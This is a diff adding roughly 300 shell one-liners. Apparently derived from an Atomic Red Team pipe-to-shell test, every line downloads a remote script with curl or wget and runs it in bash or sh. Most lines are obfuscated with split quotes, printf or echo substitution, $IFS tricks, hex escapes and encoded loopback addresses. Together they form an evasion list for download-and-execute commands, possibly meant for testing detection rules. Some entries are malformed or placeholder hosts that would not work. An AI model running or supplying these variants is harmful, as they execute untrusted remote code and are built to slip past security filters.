@@ -1,0 +1,301 @@
+cd /t""mp; c"u"rl -s #{remote_url} | ba"sh"; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; $(printf c)u$(printf rl) -s #{remote_url} | ba$'sh'; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t\mp; c$'url' -s #{remote_url} | b"a"sh; ls -la /t\mp/art.txt
+cd ${TMPDIR:-/t""mp}; `printf c`url -s #{remote_url} | ba`printf sh`; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; cu$'rl' -s #{remote_url} | b${0##*/}ash; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; $(echo cu)rl -s #{remote_url} | ba$(echo sh); ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; c$(printf u)rl -s #{remote_url} | b$(printf a)sh; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; c$((99/99))url -s #{remote_url} | ba$((10/10))sh; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; $(printf %s c)u$(printf %s rl) -s #{remote_url} | b$(printf %s a)sh; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; c${IFS}url -s #{remote_url} | b${IFS}ash; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; c$'\x75'rl -s #{remote_url} | b$'\x61'sh; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; $(echo c)$(echo u)rl -s #{remote_url} | $(echo b)ash; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; c"ur"l -s #{remote_url} | b"a"s"h"; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; cu"r"l -s #{remote_url} | ba"s"h; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; $(printf cu)rl -s #{remote_url} | $(printf ba)sh; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; c$'u''rl' -s #{remote_url} | b$'a''sh'; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; c$((1+0))url -s #{remote_url} | b$((1+0))ash; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; c$(echo u)$(echo rl) -s #{remote_url} | b$(echo a)$(echo sh); ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; $(printf %b c)u$(printf %b rl) -s #{remote_url} | b$(printf %b a)sh; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; c${PATH%%:*}url -s #{remote_url} | ba${PATH%%:*}sh; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; c$IFSurl -s #{remote_url} | b${IFS}ash; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; cu$IFSrl -s #{remote_url} | ba$IFSsh; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; c$(printf '\165')rl -s #{remote_url} | b$(printf '\141')sh; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; c$'\u0075'rl -s #{remote_url} | b$'\u0061'sh; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; c$(echo -n u)rl -s #{remote_url} | b$(echo -n a)sh; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; c"u""rl" -s #{remote_url} | b"a""sh"; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; c$'ur''l' -s #{remote_url} | b$'as''h'; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; c$(printf u)$(printf rl) -s #{remote_url} | b$(printf a)$(printf sh); ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; $(echo cu)$(echo rl) -s #{remote_url} | $(echo ba)$(echo sh); ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; c${IFS}u${IFS}rl -s #{remote_url} | b${IFS}a${IFS}sh; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t"m"p; c"ur""l" -s #{remote_url} | ba"sh"; ls -la /t"m"p/art.txt
+cd /tmp; c'u''r''l' -s #{remote_url} | b'a''s''h'; ls -la /tmp/art.txt
+cd /t\\mp; c"u""rl" -s #{remote_url} | b"a""sh"; ls -la /t\\mp/art.txt
+cd $(echo /tmp); c$(echo url) -s #{remote_url} | b$(echo ash); ls -la $(echo /tmp)/art.txt
+cd /t""mp; cu""rl -s #{remote_url} | b""ash; ls -la /t""mp/art.txt
+cd /tmp; c\u0075rl -s #{remote_url} | b\u0061sh; ls -la /tmp/art.txt
+cd /tmp; $(printf 'curl') -s #{remote_url} | $(printf 'bash'); ls -la /tmp/art.txt
+cd /tmp; \curl -s #{remote_url} | \bash; ls -la /tmp/art.txt
+cd /tmp; c\url -s #{remote_url} | b\ash; ls -la /tmp/art.txt
+cd /tmp; c${PWD##*/}url -s #{remote_url} | b${PWD##*/}ash; ls -la /tmp/art.txt
+cd /tmp; c\u0075rl -s #{remote_url} | b\u0061sh; ls -la /tmp/art.txt
+cd /tmp; `echo curl` -s #{remote_url} | `echo bash`; ls -la /tmp/art.txt
+cd /tmp; curl --silent #{remote_url} | bash --noprofile; ls -la /tmp/art.txt
+cd /tmp; curl -s #{remote_url} | command bash; ls -la /tmp/art.txt
+cd /tmp; curl -s #{remote_url} | /bin/"bash"; ls -la /tmp/art.txt
+cd /tmp; curl -s #{remote_url} | /bin/ba"sh"; ls -la /tmp/art.txt
+cd /tmp; c"u""rl" -s #{remote_url} | /b"in/bash"; ls -la /tmp/art.txt
+cd /tmp; /usr/bin/cu"rl" -s #{remote_url} | /usr/bin/ba"sh"; ls -la /tmp/art.txt
+cd /tmp; /usr/bin/c"ur"l -s #{remote_url} | /usr/bin/ba"sh"; ls -la /tmp/art.txt
+cd /tmp; cu\rl -s #{remote_url} | ba\sh; ls -la /tmp/art.txt
+cd /tmp; cur\l -s #{remote_url} | bas\h; ls -la /tmp/art.txt
+cd /tmp; \c\u\r\l -s #{remote_url} | \b\a\s\h; ls -la /tmp/art.txt
+cd /tmp; curl -s #{remote_url} | sh -c "bash"; ls -la /tmp/art.txt
+cd /tmp; curl -s #{remote_url} | sh$IFS-c$IFS"bash"; ls -la /tmp/art.txt
+cd /tmp; curl -s #{remote_url} | sh$'\x20'-c$'\x20'bash; ls -la /tmp/art.txt
+cd /tmp; curl -s #{remote_url} | s"h" -c 'ba"sh"'; ls -la /tmp/art.txt
+cd /tmp; curl -s #{remote_url} | sh -c 'ev'"al bash'; ls -la /tmp/art.txt
+cd /tmp; curl -s #{remote_url} | sh -c "e""val ba""sh"; ls -la /tmp/art.txt
+cd /tmp; c"$@"url -s #{remote_url} | b"$@"ash; ls -la /tmp/art.txt
+cd /tmp; ${PATH:0:4}url -s #{remote_url} | ${PATH:0:4}ash; ls -la /tmp/art.txt
+cd /tmp && curl --remote-name #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --output art.txt #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name-all #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --remote-header-name #{remote_url} --output art.txt && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl -o art.txt #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --write-out '%{filename_effective}' --remote-name #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl -# --output art.txt #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl -s --remote-name #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --retry 2 --remote-name #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl -sSL --output art.txt #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --silent --remote-name #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --url #{remote_url} --remote-name && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name --compressed #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --no-buffer --remote-name #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --fail --remote-name #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --location --remote-name #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl -L --remote-name #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --proto =https --tlsv1.2 --remote-name #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name --create-dirs #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name --max-time 10 #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --retry-delay 2 --remote-name #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --keepalive-time 30 --remote-name #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --limit-rate 100k --remote-name #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --connect-timeout 5 --remote-name #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name --user-agent "Mozilla" #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl -s --output ./art.txt #{remote_url} && bash ./art.txt && ls -la /tmp/art.txt
+cd /tmp && curl -o ./art.txt #{remote_url} && chmod +x ./art.txt && ./art.txt && ls -la /tmp/art.txt
+cd /tmp && curl -Lo art.txt #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl -fLo art.txt #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl -sLo art.txt #{remote_url} && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name --output-dir /tmp #{remote_url} && bash /tmp/art.txt && ls -la /tmp/art.txt
+1. `cd /tmp && curl --remote-name #{remote_url} | bash && ls -la /tmp/art.txt`
+2. `cd /tmp && curl --output #{remote_url} | bash && ls -la /tmp/art.txt`
+3. `cd /tmp && curl --remote-name-all #{remote_url} | bash && ls -la /tmp/art.txt`
+4. `cd /tmp && curl -J -L #{remote_url} | bash && ls -la /tmp/art.txt`
+5. `cd /tmp && curl -sSL #{remote_url} | bash && ls -la /tmp/art.txt`
+6. `cd /tmp && curl --location --remote-name #{remote_url} | bash && ls -la /tmp/art.txt`
+7. `cd /tmp && curl --output-document - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt`
+8. `cd /tmp && curl --progress-bar --remote-name #{remote_url} | bash && ls -la /tmp/art.txt`
+9. `cd /tmp && curl --silent --location --remote-name #{remote_url} | bash && ls -la /tmp/art.txt`
+10. `cd /tmp && curl --compressed --remote-name #{remote_url} | bash && ls -la /tmp/art.txt`
+11. `cd /tmp && curl --http1.1 --remote-name #{remote_url} | bash && ls -la /tmp/art.txt`
+12. `cd /tmp && curl --tlsv1.3 --remote-name #{remote_url} | bash && ls -la /tmp/art.txt`
+13. `cd /tmp && curl --retry 3 --remote-name #{remote_url} | bash && ls -la /tmp/art.txt`
+14. `cd /tmp && curl --fail --remote-name #{remote_url} | bash && ls -la /tmp/art.txt`
+15. `cd /tmp && curl --remote-name --create-dirs #{remote_url} | bash && ls -la /tmp/art.txt`
+16. `cd /tmp && curl --remote-name --output-dir . #{remote_url} | bash && ls -la /tmp/art.txt`
+17. `cd /tmp && curl -s --output - #{remote_url} | bash && ls -la /tmp/art.txt`
+18. `cd /tmp && curl -L --output - #{remote_url} | bash && ls -la /tmp/art.txt`
+19. `cd /tmp && curl -fsSL #{remote_url} | bash && ls -la /tmp/art.txt`
+20. `cd /tmp && curl -k --remote-name #{remote_url} | bash && ls -la /tmp/art.txt`
+21. `cd /tmp && curl --remote-name -s #{remote_url} | bash && ls -la /tmp/art.txt`
+22. `cd /tmp && curl --remote-name -L #{remote_url} | bash && ls -la /tmp/art.txt`
+23. `cd /tmp && curl --remote-name -k #{remote_url} | bash && ls -la /tmp/art.txt`
+24. `cd /tmp && curl --remote-name -sL #{remote_url} | bash && ls -la /tmp/art.txt`
+25. `cd /tmp && curl --remote-name -fL #{remote_url} | bash && ls -la /tmp/art.txt`
+26. `cd /tmp && curl --remote-name --silent #{remote_url} | bash && ls -la /tmp/art.txt`
+27. `cd /tmp && curl --remote-name --location #{remote_url} | bash && ls -la /tmp/art.txt`
+28. `cd /tmp && curl --remote-name --output - #{remote_url} | bash && ls -la /tmp/art.txt`
+29. `cd /tmp && curl -s --remote-name #{remote_url} | bash && ls -la /tmp/art.txt`
+30. `cd /tmp && curl -# --remote-name #{remote_url} | bash && ls -la /tmp/art.txt`
+1. `cd /tmp && curl #{remote_url} | bash && ls -la /tmp/art.txt`
+2. `cd /tmp && curl -s #{remote_url} | bash && ls -la /tmp/art.txt`
+3. `cd /tmp && curl -L #{remote_url} | bash && ls -la /tmp/art.txt`
+4. `cd /tmp && curl -fs #{remote_url} | bash && ls -la /tmp/art.txt`
+5. `cd /tmp && curl -k #{remote_url} | bash && ls -la /tmp/art.txt`
+6. `cd /tmp && curl -sSL #{remote_url} | bash && ls -la /tmp/art.txt`
+7. `cd /tmp && curl --url #{remote_url} | bash && ls -la /tmp/art.txt`
+8. `cd /tmp && curl -# #{remote_url} | bash && ls -la /tmp/art.txt`
+9. `cd /tmp && curl --location #{remote_url} | bash && ls -la /tmp/art.txt`
+10. `cd /tmp && curl --fail #{remote_url} | bash && ls -la /tmp/art.txt`
+11. `cd /tmp && curl -s --insecure #{remote_url} | bash && ls -la /tmp/art.txt`
+12. `cd /tmp && curl #{remote_url} | bash`
+13. `cd /tmp && curl #{remote_url} | sh`
+14. `curl #{remote_url} | bash`
+15. `curl #{remote_url} | sh`
+16. `cd /tmp; curl #{remote_url} | bash; ls /tmp/art.txt`
+17. `curl -s #{remote_url} | sh`
+18. `bash -c "$(curl #{remote_url})" && ls -la /tmp/art.txt`
+19. `bash -c "$(curl -s #{remote_url})"`
+20. `cd /tmp; bash -c "$(curl #{remote_url})"`
+21. `cd /tmp; sh -c "$(curl #{remote_url})"`
+22. `cd /tmp && curl #{remote_url} | .`
+23. `cd /tmp && curl #{remote_url} | source /dev/stdin`
+24. `curl #{remote_url} | source /dev/stdin`
+25. `cd /tmp && bash < <(curl #{remote_url})`
+26. `bash < <(curl #{remote_url})`
+27. `cd /tmp && bash <(curl #{remote_url})`
+28. `cd /tmp; . <(curl #{remote_url})`
+29. `curl #{remote_url} | eval`
+30. `cd /tmp && eval "$(curl #{remote_url})"`
+1. `cd /tmp; curl #{remote_url} | . /dev/stdin`
+2. `cd /tmp; curl #{remote_url} | bash -`
+3. `cd /tmp; curl #{remote_url} | env bash`
+4. `cd /tmp; curl #{remote_url} | command bash`
+5. `cd /tmp; curl #{remote_url} | nohup bash`
+6. `cd /tmp; curl #{remote_url} | setsid bash`
+7. `cd /tmp; curl #{remote_url} | exec bash`
+8. `cd /tmp; curl #{remote_url} | bash --norc`
+9. `cd /tmp; curl #{remote_url} | bash --noprofile`
+10. `cd /tmp; curl #{remote_url} | bash -s`
+11. `cd /tmp; curl #{remote_url} | bash -e`
+12. `cd /tmp; curl #{remote_url} | bash -u`
+13. `cd /tmp; curl #{remote_url} | bash -x`
+14. `cd /tmp; curl #{remote_url} | bash -c`
+15. `cd /tmp; curl #{remote_url} | /bin/bash`
+16. `cd /tmp; curl #{remote_url} | /usr/bin/bash`
+17. `cd /tmp; curl #{remote_url} | /usr/local/bin/bash`
+18. `cd /tmp; curl #{remote_url} | /bin/sh`
+19. `cd /tmp; curl #{remote_url} | /usr/bin/sh`
+20. `cd /tmp; curl #{remote_url} | /usr/local/bin/sh`
+21. `cd /tmp; curl #{remote_url} | sh -s`
+22. `cd /tmp; curl #{remote_url} | sh -e`
+23. `cd /tmp; curl #{remote_url} | sh -u`
+24. `cd /tmp; curl #{remote_url} | sh -x`
+25. `cd /tmp; curl #{remote_url} | cat > /dev/null`
+26. `cd /tmp; curl #{remote_url} | tee /dev/null | bash`
+27. `cd /tmp; curl #{remote_url} > fetched.sh && bash fetched.sh`
+28. `cd /tmp; curl #{remote_url} > f.sh && . f.sh`
+29. `cd /tmp; curl #{remote_url} > temp.sh && /bin/bash temp.sh`
+30. `cd /tmp; curl #{remote_url} > /tmp/a && bash /tmp/a`
+1. `curl -s #{remote_url} | bash; cd /tmp; ls -la /tmp/art.txt`
+2. `ls -la /tmp/art.txt; curl -s #{remote_url} | bash; cd /tmp`
+3. `bash -c "$(curl -s #{remote_url})"; cd /tmp; ls -la /tmp/art.txt`
+4. `cd /tmp; ls -la /tmp/art.txt; curl -s #{remote_url} | bash`
+5. `ls -la /tmp/art.txt; cd /tmp; curl -s #{remote_url} | bash`
+6. `bash -c "$(curl #{remote_url})"; ls -la /tmp/art.txt; cd /tmp`
+7. `curl -s #{remote_url} | bash && cd /tmp && ls -la /tmp/art.txt`
+8. `ls -la /tmp/art.txt && curl -s #{remote_url} | bash && cd /tmp`
+9. `cd /tmp && ls -la /tmp/art.txt && curl -s #{remote_url} | bash`
+10. `cd /tmp && curl -s #{remote_url} | bash && ls -la /tmp/art.txt`
+11. `bash -c "$(curl -s #{remote_url})" && cd /tmp && ls -la /tmp/art.txt`
+12. `curl -s #{remote_url} | bash; ls -la /tmp/art.txt; cd /tmp`
+13. `ls -la /tmp/art.txt; bash -c "$(curl -s #{remote_url})"; cd /tmp`
+14. `curl #{remote_url} | bash && ls -la /tmp/art.txt && cd /tmp`
+15. `ls -la /tmp/art.txt && cd /tmp && curl #{remote_url} | bash`
+16. `bash -c "$(curl #{remote_url})"; cd /tmp; ls -la /tmp/art.txt`
+17. `ls -la /tmp/art.txt && bash -c "$(curl #{remote_url})" && cd /tmp`
+18. `cd /tmp && bash <(curl #{remote_url}) && ls -la /tmp/art.txt`
+19. `bash <(curl #{remote_url}) && ls -la /tmp/art.txt && cd /tmp`
+20. `ls -la /tmp/art.txt && bash <(curl #{remote_url}) && cd /tmp`
+21. `curl #{remote_url} | tee /tmp/f.sh | bash && ls -la /tmp/art.txt`
+22. `bash /tmp/f.sh; curl #{remote_url} > /tmp/f.sh; ls -la /tmp/art.txt`
+23. `ls -la /tmp/art.txt; curl #{remote_url} > /tmp/f.sh; bash /tmp/f.sh`
+24. `bash /tmp/f.sh && ls -la /tmp/art.txt && curl #{remote_url} > /tmp/f.sh`
+25. `cd /tmp; bash /tmp/f.sh; curl #{remote_url} > /tmp/f.sh; ls -la /tmp/art.txt`
+26. `ls -la /tmp/art.txt && bash /tmp/f.sh && curl #{remote_url} > /tmp/f.sh`
+27. `curl #{remote_url} > /tmp/f.sh; bash /tmp/f.sh && ls -la /tmp/art.txt`
+28. `ls -la /tmp/art.txt; bash -c "$(curl #{remote_url})"; cd /tmp`
+29. `bash -c "$(curl #{remote_url})" && cd /tmp; ls -la /tmp/art.txt`
+30. `cd /tmp; bash -c "$(curl #{remote_url})"; ls -la /tmp/art.txt`
+1. `curl -s #{remote_url} | bash; ls -la /tmp/art.txt; cd /tmp`
+2. `ls -la /tmp/art.txt; cd /tmp; bash -c "$(curl -s #{remote_url})"`
+3. `bash -c "$(curl -s #{remote_url})"; ls -la /tmp/art.txt; cd /tmp`
+4. `curl -s #{remote_url} | bash; cd /tmp; ls -la art.txt`
+5. `bash -c "$(cd /tmp && curl -s #{remote_url})"; ls -la /tmp/art.txt`
+6. `cd /tmp; bash -c "$(curl -s #{remote_url})"; ls -la art.txt`
+7. `ls -la /tmp/art.txt; cd /tmp && bash -c "$(curl -s #{remote_url})"`
+8. `bash -c "$(curl -s #{remote_url})" && ls -la /tmp/art.txt && cd /tmp`
+9. `cd /tmp && ls -la art.txt && curl -s #{remote_url} | bash`
+10. `bash -c "$(curl -s #{remote_url})"; cd /tmp; ls -la /tmp/art.txt`
+11. `ls -la /tmp/art.txt && curl -s #{remote_url} | bash && cd /tmp`
+12. `curl -s #{remote_url} | tee /dev/null | bash && ls -la /tmp/art.txt`
+13. `cd /tmp && ls -la /tmp/art.txt && bash -c "$(curl #{remote_url})"`
+14. `bash -c "$(curl #{remote_url})" && cd /tmp && ls -la art.txt`
+15. `curl #{remote_url} | bash; cd /tmp; ls -la /tmp/art.txt`
+16. `ls -la /tmp/art.txt && cd /tmp && bash <(curl #{remote_url})`
+17. `bash <(curl #{remote_url}) && cd /tmp && ls -la /tmp/art.txt`
+18. `cd /tmp && bash -c "$(curl #{remote_url})" && ls -la art.txt`
+19. `bash -c "$(cd /tmp && curl #{remote_url})"; ls -la /tmp/art.txt`
+20. `ls -la /tmp/art.txt; bash -c "$(cd /tmp && curl #{remote_url})"`
+21. `cd /tmp; ls -la /tmp/art.txt; curl #{remote_url} | bash`
+22. `ls -la /tmp/art.txt; bash <(curl #{remote_url}); cd /tmp`
+23. `curl #{remote_url} | bash && cd /tmp; ls -la art.txt`
+24. `curl #{remote_url} | bash && ls -la art.txt && cd /tmp`
+25. `bash <(curl #{remote_url}) && cd /tmp; ls -la art.txt`
+26. `cd /tmp && bash -c "$(curl #{remote_url})" && ls -la`
+27. `cd /tmp && bash <(curl #{remote_url}); ls -la`
+28. `curl #{remote_url} | bash; ls -la /tmp; cd /tmp`
+29. `ls -la /tmp; cd /tmp; curl #{remote_url} | bash`
+30. `cd /tmp; curl #{remote_url} | bash; ls /tmp`
+1. `cd /tmp && curl -s http://2130706433/script.sh | bash && ls -la /tmp/art.txt`
+2. `cd /tmp && curl -s http://0x7f000001/script.sh | bash && ls -la /tmp/art.txt`
+3. `cd /tmp && curl -s http://017700000001/script.sh | bash && ls -la /tmp/art.txt`
+4. `cd /tmp && curl -s http://127.0.1/script.sh | bash && ls -la /tmp/art.txt`
+5. `cd /tmp && curl -s http://127.1/script.sh | bash && ls -la /tmp/art.txt`
+6. `cd /tmp && curl -s http://0x7f.0.0.1/script.sh | bash && ls -la /tmp/art.txt`
+7. `cd /tmp && curl -s http://127.000.000.001/script.sh | bash && ls -la /tmp/art.txt`
+8. `cd /tmp && curl -s http://localhost/script.sh | bash && ls -la /tmp/art.txt`
+9. `cd /tmp && curl -s http://[::1]/script.sh | bash && ls -la /tmp/art.txt`
+10. `cd /tmp && curl -s http://0177.0.0.1/script.sh | bash && ls -la /tmp/art.txt`
+11. `cd /tmp && curl -s http://0x7f.0x00.0x00.0x01/script.sh | bash && ls -la /tmp/art.txt`
+12. `cd /tmp && curl -s http://十进制地址/script.sh | bash && ls -la /tmp/art.txt` *(assumed alias or Unicode obfuscation)*
+13. `cd /tmp && curl -s hxxp://127[.]0[.]0[.]1/script.sh | bash && ls -la /tmp/art.txt`
+14. `cd /tmp && curl -s http://127.0.0.1%00/script.sh | bash && ls -la /tmp/art.txt`
+15. `cd /tmp && curl -s http://127.0.0.1%2fscript.sh | bash && ls -la /tmp/art.txt`
+16. `cd /tmp && curl -s http://%31%32%37.0.0.1/script.sh | bash && ls -la /tmp/art.txt`
+17. `cd /tmp && curl -s http://\x7f\x00\x00\x01/script.sh | bash && ls -la /tmp/art.txt`
+18. `cd /tmp && curl -s http://\u007f.0.0.1/script.sh | bash && ls -la /tmp/art.txt`
+19. `cd /tmp && curl -s http://[127.0.0.1]/script.sh | bash && ls -la /tmp/art.txt`
+20. `cd /tmp && curl -s http://0x7f000001/script.sh | bash | ls -la /tmp/art.txt`
+21. `cd /tmp && curl -s http://0/0/0/1/script.sh | bash && ls -la /tmp/art.txt`
+22. `cd /tmp && curl -s http://0x7f.1/script.sh | bash && ls -la /tmp/art.txt`
+23. `cd /tmp && curl -s http://7f000001/script.sh | bash && ls -la /tmp/art.txt`
+24. `cd /tmp && curl -s http://0127.0000.00.0001/script.sh | bash && ls -la /tmp/art.txt`
+25. `cd /tmp && curl -s http://127%2E0%2E0%2E1/script.sh | bash && ls -la /tmp/art.txt`
+26. `cd /tmp && curl -s http://⌂/script.sh | bash && ls -la /tmp/art.txt` *(if encoded hostname)*
+27. `cd /tmp && curl -s http://[0:0:0:0:0:0:0:1]/script.sh | bash && ls -la /tmp/art.txt`
+28. `cd /tmp && curl -s http://127.0.0.1./script.sh | bash && ls -la /tmp/art.txt`
+29. `cd /tmp && curl -s http://000000177.0.0.1/script.sh | bash && ls -la /tmp/art.txt`
+30. `cd /tmp && curl -s http://0177.0000.0000.0001/script.sh | bash && ls -la /tmp/art.txt`
+1. cd /tmp && curl -s http://2130706433/scr.sh | bash && ls -la /tmp/art.txt
+2. cd /tmp && curl -s http://2130706433/ | bash && ls -la /tmp/art.txt
+3. cd /tmp && wget -qO- http://2130706433/script.sh | bash && ls -la /tmp/art.txt
+4. cd /tmp && wget -qO- http://2130706433 | bash && ls -la /tmp/art.txt
+5. cd /tmp && curl http://2130706433/init.sh | bash && ls -la /tmp/art.txt
+6. cd /tmp && curl http://2130706433 | bash && ls -la /tmp/art.txt
+7. curl -s http://2130706433/code | bash && ls -la /tmp/art.txt
+8. wget -qO- http://2130706433 | sh && ls -la /tmp/art.txt
+9. bash -c "$(curl -fsSL http://2130706433/payload.sh)" && ls -la /tmp/art.txt
+10. bash -c "$(wget -qO- http://2130706433/payload.sh)" && ls -la /tmp/art.txt
+11. cd /tmp && curl -s http://2130706433/1.sh | sh && ls -la /tmp/art.txt
+12. cd /tmp && curl -L http://2130706433/run.sh | sh && ls -la /tmp/art.txt
+13. curl -fsSL http://2130706433/shell.sh | bash && ls -la /tmp/art.txt
+14. wget http://2130706433/setup.sh -O- | sh && ls -la /tmp/art.txt
+15. cd /tmp && bash <(curl -s http://2130706433/run.sh) && ls -la /tmp/art.txt
+16. curl http://2130706433/install.sh | /bin/sh && ls -la /tmp/art.txt
+17. wget -O - http://2130706433/start.sh | /bin/bash && ls -la /tmp/art.txt
+18. cd /tmp && sh -c "$(curl -fsSL http://2130706433/load.sh)" && ls -la /tmp/art.txt
+19. curl -sL http://2130706433/a.sh | bash && ls -la /tmp/art.txt
+20. curl -k http://2130706433 | bash && ls -la /tmp/art.txt
+21. cd /tmp && curl --silent http://2130706433 | bash && ls -la /tmp/art.txt
+22. cd /tmp && curl --url http://2130706433/run | bash && ls -la /tmp/art.txt
+23. curl http://2130706433/test.sh -o - | bash && ls -la /tmp/art.txt
+24. curl http://2130706433 --output - | bash && ls -la /tmp/art.txt
+25. curl http://2130706433 -o - | sh && ls -la /tmp/art.txt
+26. bash <(wget -qO- http://2130706433/load.sh) && ls -la /tmp/art.txt
+27. cd /tmp && bash -c "$(curl -s http://2130706433/x.sh)" && ls -la /tmp/art.txt
+28. sh -c "$(curl -fsSL http://2130706433/z.sh)" && ls -la /tmp/art.txt
+29. curl -Ns http://2130706433/evil.sh | bash && ls -la /tmp/art.txt
+30. curl -s --max-time 10 http://2130706433/payload | sh && ls -la /tmp/art.txt
